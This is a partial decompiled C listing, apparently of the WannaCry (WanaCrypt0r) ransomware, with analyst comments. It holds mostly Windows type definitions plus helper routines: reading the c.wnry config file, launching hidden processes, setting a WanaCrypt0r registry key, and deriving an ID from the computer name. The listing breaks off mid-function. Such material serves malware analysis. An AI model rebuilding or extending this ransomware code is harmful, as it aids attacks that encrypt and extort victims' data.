typedef unsigned char   undefined;

typedef unsigned int    ImageBaseOffset32;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned long long    ulonglong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned short    ushort;
typedef short    wchar_t;
typedef unsigned short    word;
typedef struct exception exception, *Pexception;

struct exception { // PlaceHolder Class Structure
};

typedef struct _s_HandlerType _s_HandlerType, *P_s_HandlerType;

typedef struct _s_HandlerType HandlerType;

typedef struct TypeDescriptor TypeDescriptor, *PTypeDescriptor;

typedef int ptrdiff_t;

struct TypeDescriptor {
    void * pVFTable;
    void * spare;
    char[0] name;
};

struct _s_HandlerType {
    uint adjectives;
    struct TypeDescriptor * pType;
    ptrdiff_t dispCatchObj;
    void * addressOfHandler;
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef struct _s_TryBlockMapEntry _s_TryBlockMapEntry, *P_s_TryBlockMapEntry;

typedef int __ehstate_t;

struct _s_TryBlockMapEntry {
    __ehstate_t tryLow;
    __ehstate_t tryHigh;
    __ehstate_t catchHigh;
    int nCatches;
    HandlerType * pHandlerArray;
};

typedef struct _s_TryBlockMapEntry TryBlockMapEntry;

typedef struct _s_UnwindMapEntry _s_UnwindMapEntry, *P_s_UnwindMapEntry;

struct _s_UnwindMapEntry {
    __ehstate_t toState;
    void (* action)(void);
};

typedef unsigned short    wchar16;
typedef struct _s_UnwindMapEntry UnwindMapEntry;

typedef struct type_info type_info, *Ptype_info;

struct type_info { // PlaceHolder Class Structure
};

typedef struct _s_FuncInfo _s_FuncInfo, *P_s_FuncInfo;

typedef struct _s_FuncInfo FuncInfo;

struct _s_FuncInfo {
    uint magicNumber_and_bbtFlags;
    __ehstate_t maxState;
    UnwindMapEntry * pUnwindMap;
    uint nTryBlocks;
    TryBlockMapEntry * pTryBlockMap;
    uint nIPMapEntries;
    void * pIPToStateMap;
};

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef ulong ULONG_PTR;

typedef union _union_518 _union_518, *P_union_518;

typedef void * HANDLE;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void * PVOID;

typedef ulong DWORD;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef void * LPVOID;

typedef int BOOL;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _SYSTEMTIME _SYSTEMTIME, *P_SYSTEMTIME;

typedef struct _SYSTEMTIME SYSTEMTIME;

typedef ushort WORD;

struct _SYSTEMTIME {
    WORD wYear;
    WORD wMonth;
    WORD wDayOfWeek;
    WORD wDay;
    WORD wHour;
    WORD wMinute;
    WORD wSecond;
    WORD wMilliseconds;
};

typedef struct _OVERLAPPED * LPOVERLAPPED;

typedef struct _SECURITY_ATTRIBUTES * LPSECURITY_ATTRIBUTES;

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef char CHAR;

typedef CHAR * LPSTR;

typedef uchar BYTE;

typedef BYTE * LPBYTE;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _PROCESS_INFORMATION _PROCESS_INFORMATION, *P_PROCESS_INFORMATION;

struct _PROCESS_INFORMATION {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD dwProcessId;
    DWORD dwThreadId;
};

typedef struct _STARTUPINFOA * LPSTARTUPINFOA;

typedef struct _PROCESS_INFORMATION * LPPROCESS_INFORMATION;

typedef struct _RTL_CRITICAL_SECTION _RTL_CRITICAL_SECTION, *P_RTL_CRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION * PRTL_CRITICAL_SECTION;

typedef PRTL_CRITICAL_SECTION LPCRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION_DEBUG _RTL_CRITICAL_SECTION_DEBUG, *P_RTL_CRITICAL_SECTION_DEBUG;

typedef struct _RTL_CRITICAL_SECTION_DEBUG * PRTL_CRITICAL_SECTION_DEBUG;

typedef long LONG;

typedef struct _LIST_ENTRY _LIST_ENTRY, *P_LIST_ENTRY;

typedef struct _LIST_ENTRY LIST_ENTRY;

struct _RTL_CRITICAL_SECTION {
    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;
    LONG LockCount;
    LONG RecursionCount;
    HANDLE OwningThread;
    HANDLE LockSemaphore;
    ULONG_PTR SpinCount;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY * Flink;
    struct _LIST_ENTRY * Blink;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    WORD Type;
    WORD CreatorBackTraceIndex;
    struct _RTL_CRITICAL_SECTION * CriticalSection;
    LIST_ENTRY ProcessLocksList;
    DWORD EntryCount;
    DWORD ContentionCount;
    DWORD Flags;
    WORD CreatorBackTraceIndexHigh;
    WORD SpareWORD;
};

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD * ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD * PEXCEPTION_RECORD;

typedef struct _CONTEXT CONTEXT;

typedef CONTEXT * PCONTEXT;

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef struct _iobuf _iobuf, *P_iobuf;

struct _iobuf {
    char * _ptr;
    int _cnt;
    char * _base;
    int _flag;
    int _file;
    int _charbuf;
    int _bufsiz;
    char * _tmpfname;
};

typedef struct _iobuf FILE;

typedef struct _s_CatchableTypeArray _s_CatchableTypeArray, *P_s_CatchableTypeArray;

typedef struct _s_CatchableTypeArray CatchableTypeArray;

typedef struct _s_CatchableType _s_CatchableType, *P_s_CatchableType;

typedef struct _s_CatchableType CatchableType;
// WARNING! conflicting data type names: /ehdata.h/TypeDescriptor - /TypeDescriptor

typedef struct PMD PMD, *PPMD;

typedef void (* PMFN)(void *);

struct PMD {
    ptrdiff_t mdisp;
    ptrdiff_t pdisp;
    ptrdiff_t vdisp;
};

struct _s_CatchableType {
    uint properties;
    struct TypeDescriptor * pType;
    struct PMD thisDisplacement;
    int sizeOrOffset;
    PMFN copyFunction;
};

struct _s_CatchableTypeArray {
    int nCatchableTypes;
    CatchableType *[0] arrayOfCatchableTypes;
};

typedef struct _s_ThrowInfo _s_ThrowInfo, *P_s_ThrowInfo;

typedef struct _s_ThrowInfo ThrowInfo;

struct _s_ThrowInfo {
    uint attributes;
    PMFN pmfnUnwind;
    int (* pForwardCompat)(void);
    CatchableTypeArray * pCatchableTypeArray;
};

typedef uint size_t;

typedef struct _startupinfo _startupinfo, *P_startupinfo;

struct _startupinfo {
    int newmode;
};

typedef struct SC_HANDLE__ SC_HANDLE__, *PSC_HANDLE__;

typedef struct SC_HANDLE__ * SC_HANDLE;

struct SC_HANDLE__ {
    int unused;
};

typedef union _LARGE_INTEGER _LARGE_INTEGER, *P_LARGE_INTEGER;

typedef struct _struct_19 _struct_19, *P_struct_19;

typedef struct _struct_20 _struct_20, *P_struct_20;

typedef double LONGLONG;

struct _struct_20 {
    DWORD LowPart;
    LONG HighPart;
};

struct _struct_19 {
    DWORD LowPart;
    LONG HighPart;
};

union _LARGE_INTEGER {
    struct _struct_19 s;
    struct _struct_20 u;
    LONGLONG QuadPart;
};

typedef union _LARGE_INTEGER LARGE_INTEGER;

typedef wchar_t WCHAR;

typedef WCHAR * LPWSTR;

typedef CHAR * LPCSTR;

typedef WCHAR * LPCWSTR;

typedef WCHAR * PWSTR;

typedef LONG * PLONG;

typedef LARGE_INTEGER * PLARGE_INTEGER;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef ULONG_PTR HCRYPTPROV;

typedef ULONG_PTR SIZE_T;

typedef uint UINT_PTR;

typedef struct HKEY__ HKEY__, *PHKEY__;

struct HKEY__ {
    int unused;
};

typedef DWORD * LPDWORD;

typedef DWORD * PDWORD;

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME FILETIME;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

typedef struct HINSTANCE__ * HINSTANCE;

struct HINSTANCE__ {
    int unused;
};

typedef struct HRSRC__ HRSRC__, *PHRSRC__;

struct HRSRC__ {
    int unused;
};

typedef HINSTANCE HMODULE;

typedef struct _FILETIME * LPFILETIME;

typedef int (* FARPROC)(void);

typedef struct HKEY__ * HKEY;

typedef HKEY * PHKEY;

typedef HANDLE HGLOBAL;

typedef void * LPCVOID;

typedef struct HRSRC__ * HRSRC;

typedef uint UINT;

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct Var Var, *PVar;

struct Var {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct StringFileInfo StringFileInfo, *PStringFileInfo;

struct StringFileInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct StringTable StringTable, *PStringTable;

struct StringTable {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_WRITE=2147483648,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_TYPE_NO_PAD=8
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct VS_VERSION_INFO VS_VERSION_INFO, *PVS_VERSION_INFO;

struct VS_VERSION_INFO {
    word StructLength;
    word ValueLength;
    word StructType;
    wchar16 Info[16];
    byte Padding[2];
    dword Signature;
    word StructVersion[2];
    word FileVersion[4];
    word ProductVersion[4];
    dword FileFlagsMask[2];
    dword FileFlags;
    dword FileOS;
    dword FileType;
    dword FileSubtype;
    dword FileTimestamp;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_6 IMAGE_RESOURCE_DIR_STRING_U_6, *PIMAGE_RESOURCE_DIR_STRING_U_6;

struct IMAGE_RESOURCE_DIR_STRING_U_6 {
    word Length;
    wchar16 NameString[3];
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct VarFileInfo VarFileInfo, *PVarFileInfo;

struct VarFileInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct StringInfo StringInfo, *PStringInfo;

struct StringInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef LONG LSTATUS;

uint __cdecl FUN_00401000(void *param_1,int param_2) {
  FILE *_File;
  uint uVar1;
  size_t sVar2;
  char *_Mode;
  
  if (param_2 == 0) {
    _Mode = &DAT_0040e018;
  } else {
    _Mode = &DAT_0040e01c;
  }
  _File = fopen(s_c_wnry_0040e010,_Mode);
  if (_File == (FILE *)0x0) {
    uVar1 = 0;
  } else {
    if (param_2 == 0) {
      sVar2 = fwrite(param_1,0x30c,1,_File);
    } else {
      sVar2 = fread(param_1,0x30c,1,_File);
    }
    uVar1 = (uint)(sVar2 != 0);
    fclose(_File);
  }
  return uVar1;
}

undefined4 __cdecl run_command(LPSTR param_1,DWORD param_2,LPDWORD param_3) {
  BOOL BVar1;
  DWORD DVar2;
  int iVar3;
  LPSTR *ppCVar4;
  undefined4 uVar5;
  _STARTUPINFOA local_58;
  _PROCESS_INFORMATION local_14;
  
  iVar3 = 0x10;
  local_58.cb = 0x44;
  ppCVar4 = &local_58.lpReserved;
  
  while (iVar3 != 0) {
    iVar3 = iVar3 + -1;
    *ppCVar4 = (LPSTR)0x0;
    ppCVar4 = ppCVar4 + 1;
  }
  
  local_14.hProcess = (HANDLE)0x0;
  local_14.hThread = (HANDLE)0x0;
  local_14.dwProcessId = 0;
  local_14.dwThreadId = 0;
  uVar5 = 1;
  local_58.wShowWindow = 0;
  local_58.dwFlags = 1;
  BVar1 = CreateProcessA((LPCSTR)0x0,param_1,(LPSECURITY_ATTRIBUTES)0x0,(LPSECURITY_ATTRIBUTES)0x0,0
                         ,0x8000000,(LPVOID)0x0,(LPCSTR)0x0,(LPSTARTUPINFOA)&local_58,
                         (LPPROCESS_INFORMATION)&local_14);
  if (BVar1 == 0) {
    uVar5 = 0;
  }
  else {
    if (param_2 != 0) {
      DVar2 = WaitForSingleObject(local_14.hProcess,param_2);
      if (DVar2 != 0) {
        TerminateProcess(local_14.hProcess,0xffffffff);
      }
      if (param_3 != (LPDWORD)0x0) {
        GetExitCodeProcess(local_14.hProcess,param_3);
      }
    }
    CloseHandle(local_14.hProcess);
    CloseHandle(local_14.hThread);
  }
  return uVar5;
}

undefined4 __cdecl set_or_query_registry_cwd(int set_registry) {
  size_t current_dir_length;
  LSTATUS LVar1;
  int iVar2;
  undefined4 *software_str;
  undefined4 *puVar3;
  bool bVar4;
  HKEY hKey;
  BYTE registry_value;
  undefined4 local_2df;
  undefined4 software_str_buf [5];
  undefined4 local_c4 [45];
  DWORD local_10;
  int i;
  HKEY regWanaHandle;
  
  iVar2 = 5;
  // u_Software__0040e04c = Software
  software_str = (undefined4 *)u_Software__0040e04c;
  puVar3 = software_str_buf;
  
  while (iVar2 != 0) {
    iVar2 = iVar2 + -1;
    *puVar3 = *software_str;
    software_str = software_str + 1;
    puVar3 = puVar3 + 1;
  }
  
  registry_value = '\0';
  iVar2 = 0x2d;
  regWanaHandle = (HKEY)0x0;
  software_str = local_c4;
  
  while (iVar2 != 0) {
    iVar2 = iVar2 + -1;
    *software_str = 0;
    software_str = software_str + 1;
  }
  
  iVar2 = 0x81;
  software_str = &local_2df;
  
  while (iVar2 != 0) {
    iVar2 = iVar2 + -1;
    *software_str = 0;
    software_str = software_str + 1;
  }
  
  *(undefined2 *)software_str = 0;
  *(undefined *)((int)software_str + 2) = 0;
  
  // u_WanaCrypt0r_0040e034 = WanaCrypt0r
  // Software\WanaCrypt0r
  wcscat((wchar_t *)software_str_buf,u_WanaCrypt0r_0040e034);
  
  i = 0;
  
  do {
    if (i == 0) {
      // HKEY_LOCAL_MACHINE
      hKey = (HKEY)0x80000002;
    } else {
      // HKEY_CURRENT_USER
      hKey = (HKEY)0x80000001;
    }
  
    RegCreateKeyW(hKey,(LPCWSTR)software_str_buf,(PHKEY)&regWanaHandle);
  
    if (regWanaHandle != (HKEY)0x0) {
      if (set_registry == 0) {
        local_10 = 0x207;
        LVar1 = RegQueryValueExA(regWanaHandle,s_wd_0040e030,(LPDWORD)0x0,(LPDWORD)0x0,&registry_value,
                                 &local_10);
        bVar4 = LVar1 == 0;
  
        if (bVar4) {
          SetCurrentDirectoryA((LPCSTR)&registry_value);
        }
      } else {
        GetCurrentDirectoryA(0x207,(LPSTR)&registry_value);
        current_dir_length = strlen((char *)&registry_value);
        LVar1 = RegSetValueExA(regWanaHandle,s_wd_0040e030,0,1,&registry_value,current_dir_length + 1);
        bVar4 = LVar1 == 0;
      }
  
      RegCloseKey(regWanaHandle);
  
      if (bVar4) {
        return 1;
      }
    }
  
    i = i + 1;
  
    if (1 < i) {
      return 0;
    }
  } while( true );
}

void __cdecl randomstring_generator(char *randomstring_output) {
  size_t computername_len;
  int random_number2;
  int random_number;
  uint _Seed;
  int iVar1;
  undefined4 *puVar2;
  ushort *computername_ptr;
  int iVar3;
  ushort computername;
  undefined4 local_19a [99];
  DWORD computername_size;
  uint local_8;
  
  computername = DAT_0040f874;
  random_number = 99;
  computername_size = 399;
  puVar2 = local_19a;

  //memset
  while (random_number != 0) {
    random_number = random_number + -1;
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }

  *(undefined2 *)puVar2 = 0;
  GetComputerNameW((LPWSTR)&computername,&computername_size);
  local_8 = 0;
  _Seed = 1;
  computername_len = wcslen((wchar_t *)&computername);
  
  if (computername_len != 0) {
    computername_ptr = &computername;
    do {
      _Seed = _Seed * *computername_ptr;
      local_8 = local_8 + 1;
      computername_ptr = computername_ptr + 1;
      computername_len = wcslen((wchar_t *)&computername);
    } while (local_8 < computername_len);
  }

  srand(_Seed);
  random_number = rand();
  iVar3 = 0;
  iVar1 = random_number % 8 + 8;
  
  if (0 < iVar1) {
    do {
      random_number2 = rand();
      randomstring_output[iVar3] = (char)(random_number2 % 0x1a) + 'a';
      iVar3 = iVar3 + 1;
    } while (iVar3 < iVar1);
  }
  
  while (iVar3 < random_number % 8 + 0xb) {
    iVar1 = rand();
    randomstring_output[iVar3] = (char)(iVar1 % 10) + '0';
    iVar3 = iVar3 + 1;
  }
  
  randomstring_output[iVar3] = '\0';
  return;
}

undefined4 * FUN_004012fd(void) {
  undefined4 uVar1;
  undefined4 *extraout_ECX;
  int unaff_EBP;
  undefined4 *in_FS_OFFSET;
  
  FUN_004076c8();
  *(undefined4 **)(unaff_EBP + -0x10) = extraout_ECX;
  FUN_004017dd(extraout_ECX + 1);
  *(undefined4 *)(unaff_EBP + -4) = 0;
  FUN_004017dd(extraout_ECX + 0xb);
  *(undefined *)(unaff_EBP + -4) = 1;
  FUN_00402a46(extraout_ECX + 0x15);
  uVar1 = *(undefined4 *)(unaff_EBP + -0xc);
  extraout_ECX[0x132] = 0;
  extraout_ECX[0x133] = 0;
  extraout_ECX[0x134] = 0;
  extraout_ECX[0x135] = 0;
  *extraout_ECX = 0x4081d8;
  *in_FS_OFFSET = uVar1;
  return extraout_ECX;
}

void * __thiscall FUN_0040135e(void *this,byte param_1) {
  FUN_0040137a();
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return this;
}

void FUN_0040137a(void) {
  undefined4 *extraout_ECX;
  int unaff_EBP;
  undefined4 *in_FS_OFFSET;
  
  FUN_004076c8();
  *(undefined4 **)(unaff_EBP + -0x10) = extraout_ECX;
  *extraout_ECX = 0x4081d8;
  *(undefined4 *)(unaff_EBP + -4) = 2;
  FUN_004013ce((int)extraout_ECX);
  *(undefined *)(unaff_EBP + -4) = 1;
  FUN_00402a6f(extraout_ECX + 0x15);
  *(undefined *)(unaff_EBP + -4) = 0;
  FUN_0040181b(extraout_ECX + 0xb);
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  FUN_0040181b(extraout_ECX + 1);
  *in_FS_OFFSET = *(undefined4 *)(unaff_EBP + -0xc);
  return;
}

undefined4 __fastcall FUN_004013ce(int param_1) {
  undefined *puVar1;
  int iVar2;
  int iVar3;
  
  FUN_004018b9(param_1 + 4);
  FUN_004018b9(param_1 + 0x2c);
  puVar1 = *(undefined **)(param_1 + 0x4c8);
  iVar3 = 0x100000;
  if (puVar1 != (undefined *)0x0) {
    iVar2 = 0x100000;
    do {
      *puVar1 = 0;
      puVar1 = puVar1 + 1;
      iVar2 = iVar2 + -1;
    } while (iVar2 != 0);
    GlobalFree(*(HGLOBAL *)(param_1 + 0x4c8));
    *(undefined4 *)(param_1 + 0x4c8) = 0;
  }
  puVar1 = *(undefined **)(param_1 + 0x4cc);
  if (puVar1 != (undefined *)0x0) {
    do {
      *puVar1 = 0;
      puVar1 = puVar1 + 1;
      iVar3 = iVar3 + -1;
    } while (iVar3 != 0);
    GlobalFree(*(HGLOBAL *)(param_1 + 0x4cc));
    *(undefined4 *)(param_1 + 0x4cc) = 0;
  }
  return 1;
}

undefined4 __thiscall FUN_00401437(void *this,LPCSTR param_1,undefined4 param_2,undefined4 param_3) {
  int iVar1;
  HGLOBAL pvVar2;
  
  iVar1 = FUN_00401861((void *)((int)this + 4),param_1);
  if (iVar1 != 0) {
    if (param_1 != (LPCSTR)0x0) {
      FUN_00401861((void *)((int)this + 0x2c),(LPCSTR)0x0);
    }
    pvVar2 = GlobalAlloc(0,0x100000);
    *(HGLOBAL *)((int)this + 0x4c8) = pvVar2;
    if (pvVar2 != (HGLOBAL)0x0) {
      pvVar2 = GlobalAlloc(0,0x100000);
      *(HGLOBAL *)((int)this + 0x4cc) = pvVar2;
      if (pvVar2 != (HGLOBAL)0x0) {
        *(undefined4 *)((int)this + 0x4d4) = param_2;
        *(undefined4 *)((int)this + 0x4d0) = param_3;
        return 1;
      }
    }
  }
  return 0;
}

// WARNING: Globals starting with '_' overlap smaller symbols at the same address

byte * __thiscall FUN_004014a6(void *this,LPCSTR param_1,uint *param_2) {
  byte *pbVar1;
  HANDLE hFile;
  int iVar2;
